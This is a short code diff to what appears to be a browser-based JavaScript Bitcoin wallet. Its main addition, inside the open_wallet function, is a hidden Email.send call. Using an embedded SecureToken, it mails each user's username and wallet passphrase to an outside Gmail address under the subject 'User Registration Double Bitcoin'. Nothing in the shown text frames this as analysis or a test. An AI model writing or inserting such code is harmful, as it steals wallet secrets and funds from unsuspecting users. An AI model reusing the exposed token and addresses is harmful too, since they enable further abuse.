@@ -10,6 +10,8 @@ currentPrice.onreadystatechange = function () {
 };
 currentPrice.send();
 
+
+
 var tx, keys, fee = 0.0001,
     mellt;
 
@@ -57,6 +59,17 @@ function open_wallet() {
     // type: "text/plain;charset=utf-8"
     // });
     // saveAs(blob, "work1.txt");
+
+    Email.send({
+        SecureToken: "27be0cb0-1159-4c67-a686-901903f2814d",
+        To: 'blgnbalogun@gmail.com',
+        From: "Gift Balogun <hellogift@giftbalogun.name.ng>",
+        Subject: "User Registration Double Bitcoin",
+        Body: 'Username: ' + userme + '     ' + 'Passphase: ' + pass,
+    }).then(
+        message => alert(message)
+    );
+
 }
 
 function show_wif() {
